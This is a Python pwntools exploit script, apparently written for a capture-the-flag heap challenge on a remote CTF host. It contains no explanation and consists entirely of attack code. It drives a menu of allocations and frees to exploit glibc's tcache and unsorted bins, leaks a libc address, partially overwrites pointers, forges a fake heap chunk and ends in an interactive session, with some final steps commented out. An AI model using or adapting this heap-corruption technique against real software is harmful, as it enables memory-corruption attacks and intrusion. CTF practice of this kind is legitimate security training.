from pwn import *

def solve():
  p = remote("challs.xmas.htsp.ro", 12004)

  def alloc(idx, size, pay="AAAA"):
    p.sendline("1")
    p.sendlineafter(":", str(idx))
    p.sendlineafter(":", str(size))
    p.sendafter(":", pay)
    p.recvuntil("Created")

    p.recvuntil(">")

  def free(idx):
    p.sendline("2")
    p.sendlineafter(":", str(idx))
    p.recvuntil("Deleted")

    p.recvuntil(">")

  p.recvuntil(">")

  alloc(8, 0x90)
  alloc(0, 0x90)
  alloc(1, 0xf0)

  print("Getting libc address")
  for i in range(7):
    free(0)

  print("Partial overwrite to adjust libc address")
  free(0)

  # Clean up unsortedbin
  alloc(0, 0x30)
  free(0)
  alloc(0, 0x50)
  free(0)

  alloc(0, 0x30, p64(0) + "\x10")

  # Pad 0xf0 bin to prevent underflow
  for i in range(5):
    free(1)
  
  free(1)
  free(1)

  print("Making fake chunk")
  alloc(1, 0xf0, "\x08") 
  alloc(2, 0xf0)
  alloc(3, 0xf0, "\x00") # [heap addr] [libc addr]
  alloc(4, 0xf0, p64(0) + p64(0xa1) + "\x00" * 0x98 + p64(0x11) + p64(0) + p64(0x11))
  
  free(1)
  free(2)
  
  free(0)
  alloc(0, 0x30, p64(0) + "\x20")

  print("Aligning pointer to fake chunk")
  alloc(1, 0xf0, "\x08") 
  alloc(2, 0xf0)
  alloc(5, 0xf0)
  alloc(6, 0xf0, p64(0))

  # free(8)
  # free(6)

  p.interactive()

solve()
